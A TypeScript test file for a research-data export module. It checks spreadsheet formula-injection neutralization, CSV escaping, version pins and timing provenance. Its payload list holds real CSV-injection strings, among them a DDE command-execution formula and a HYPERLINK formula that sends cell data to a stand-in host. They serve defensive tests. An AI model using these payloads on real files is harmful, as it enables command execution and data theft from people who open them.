/**
 * The export cell contract: formula-injection neutralization, CSV escaping
 * (including the lone-`\r` case every previous escaper missed), and the two
 * reproducibility fields (version pin, timing provenance).
 *
 * These guard a security boundary — a participant-supplied answer becomes a cell
 * in a file a researcher opens with a spreadsheet — so they assert on the exact
 * bytes produced, not on "some escaping happened".
 */

import { describe, expect, it } from 'vitest';
import {
	csvCell,
	formatQuestionnaireVersion,
	formatTimingProvenance,
	neutralizeFormula,
	toCellString,
	xlsxCell,
	xlsxRow,
} from './exportCell';

/** The canonical CSV-injection payloads a spreadsheet will execute on open. */
const INJECTION_PAYLOADS = [
	"=cmd|'/c calc'!A1",
	'=1+1',
	'@SUM(1+1)',
	'+cmd|calc',
	'-2+3+cmd|calc',
	'=HYPERLINK("http://evil.test?d="&A1,"click")',
];

describe('neutralizeFormula', () => {
	it.each(INJECTION_PAYLOADS)('renders the formula payload %j inert', (payload) => {
		const out = neutralizeFormula(payload);
		expect(out).toBe(`'${payload}`);
		// The defining property: the cell no longer STARTS with a formula trigger.
		expect(out.startsWith('=')).toBe(false);
		expect(out.startsWith('@')).toBe(false);
		expect(out.startsWith('+')).toBe(false);
		expect(out.startsWith('-')).toBe(false);
	});

	it('neutralizes leading tab and carriage return, which Excel strips before parsing', () => {
		expect(neutralizeFormula('\t=1+1')).toBe("'\t=1+1");
		expect(neutralizeFormula('\r=1+1')).toBe("'\r=1+1");
	});

	it('does NOT mangle legitimate negative and signed numbers', () => {
		// The whole reason the guard cannot be a blunt "prefix anything starting
		// with -": reaction-time deltas and z-scores are routinely negative.
		for (const numeric of ['-5', '-14.2', '+3', '-0.004', '-1.5e-3', '+2.5E4', '-.5']) {
			expect(neutralizeFormula(numeric), `mangled ${numeric}`).toBe(numeric);
		}
	});

	it('leaves ordinary text and the empty string untouched', () => {
		expect(neutralizeFormula('congruent')).toBe('congruent');
		expect(neutralizeFormula('')).toBe('');
		expect(neutralizeFormula('a=b')).toBe('a=b');
	});
});

describe('csvCell', () => {
	it('quotes a lone carriage return, which would otherwise break the row', () => {
		// The bug: the old predicate tested `,` `"` `\n` only, so a bare CR passed
		// through unquoted and split the record for any CR-aware reader.
		expect(csvCell('line-one\rline-two')).toBe('"line-one\rline-two"');
	});

	it('quotes CRLF, commas, and embedded quotes (doubling the quote)', () => {
		expect(csvCell('a\r\nb')).toBe('"a\r\nb"');
		expect(csvCell('a,b')).toBe('"a,b"');
		expect(csvCell('say "hi"')).toBe('"say ""hi"""');
	});

	it('neutralizes an injection payload AND quotes it when it also needs escaping', () => {
		// A payload with a comma must be both prefixed and quoted; getting the
		// order wrong (quote-then-prefix) would put the apostrophe outside.
		expect(csvCell('=cmd|calc,1')).toBe('"\'=cmd|calc,1"');
	});

	it('passes numbers, booleans and null through faithfully', () => {
		expect(csvCell(420)).toBe('420');
		expect(csvCell(-14.2)).toBe('-14.2');
		expect(csvCell(true)).toBe('true');
		expect(csvCell(false)).toBe('false');
		expect(csvCell(null)).toBe('');
		expect(csvCell(undefined)).toBe('');
	});

	it('serializes an object cell as JSON', () => {
		expect(csvCell({ onsetMethod: 'raf' })).toBe('"{""onsetMethod"":""raf""}"');
	});
});

describe('xlsxCell / xlsxRow', () => {
	it('neutralizes a string payload but keeps numbers numeric', () => {
		expect(xlsxCell("=cmd|'/c calc'!A1")).toBe("'=cmd|'/c calc'!A1");
		// Numbers must stay JS numbers or Excel stops treating the column as numeric.
		expect(xlsxCell(420)).toBe(420);
		expect(xlsxCell(-14.2)).toBe(-14.2);
		expect(xlsxCell(true)).toBe(true);
		expect(xlsxCell(null)).toBeNull();
	});

	it('guards every field of a row', () => {
		const row = xlsxRow({ participant_id: '=1+1', reaction_time_us: 420, note: 'ok' });
		expect(row.participant_id).toBe("'=1+1");
		expect(row.reaction_time_us).toBe(420);
		expect(row.note).toBe('ok');
	});
});

describe('toCellString', () => {
	it('renders booleans and objects stably', () => {
		expect(toCellString(true)).toBe('true');
		expect(toCellString(null)).toBe('');
		expect(toCellString({ a: 1 })).toBe('{"a":1}');
	});
});

describe('formatQuestionnaireVersion', () => {
	it('renders a complete pin as semver', () => {
		expect(
			formatQuestionnaireVersion({
				questionnaire_version_major: 1,
				questionnaire_version_minor: 4,
				questionnaire_version_patch: 2,
			})
		).toBe('1.4.2');
		expect(
			formatQuestionnaireVersion({
				questionnaire_version_major: 0,
				questionnaire_version_minor: 0,
				questionnaire_version_patch: 0,
			})
		).toBe('0.0.0');
	});

	it('returns null rather than inventing a version when the pin is absent or partial', () => {
		expect(formatQuestionnaireVersion({})).toBeNull();
		expect(
			formatQuestionnaireVersion({
				questionnaire_version_major: 1,
				questionnaire_version_minor: null,
				questionnaire_version_patch: 2,
			})
		).toBeNull();
	});
});

describe('formatTimingProvenance', () => {
	it('serializes a blob and passes a pre-serialized string through', () => {
		expect(formatTimingProvenance({ onsetMethod: 'raf', displayLatencyMs: 8.3 })).toBe(
			'{"onsetMethod":"raf","displayLatencyMs":8.3}'
		);
		expect(formatTimingProvenance('{"a":1}')).toBe('{"a":1}');
		expect(formatTimingProvenance(null)).toBeNull();
		expect(formatTimingProvenance(undefined)).toBeNull();
	});

	it('degrades to null on an unserializable blob instead of throwing mid-export', () => {
		const cyclic: Record<string, unknown> = {};
		cyclic.self = cyclic;
		expect(formatTimingProvenance(cyclic)).toBeNull();
	});
});
